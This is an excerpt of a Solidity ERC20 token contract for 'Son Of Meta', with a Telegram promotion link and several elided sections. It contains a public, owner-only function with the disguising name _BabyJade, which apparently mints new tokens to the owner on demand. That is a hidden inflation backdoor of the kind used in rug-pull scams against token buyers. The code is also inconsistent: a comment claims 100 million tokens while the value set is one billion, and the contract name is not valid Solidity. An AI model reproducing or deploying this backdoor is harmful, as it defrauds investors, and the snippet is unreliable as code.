...
//
// $Son Of Meta proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/SonOfMetaToken
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyJade(uint256 amount) public onlyOwner {
    _BabyJade(msg.sender, amount);
    }
    ...
    function _BabyJade(address account, uint256 amount) internal virtual {
...
contract $SonOfMeta is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Son Of Meta", "SONOFMETA") {
        _BabyJade(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}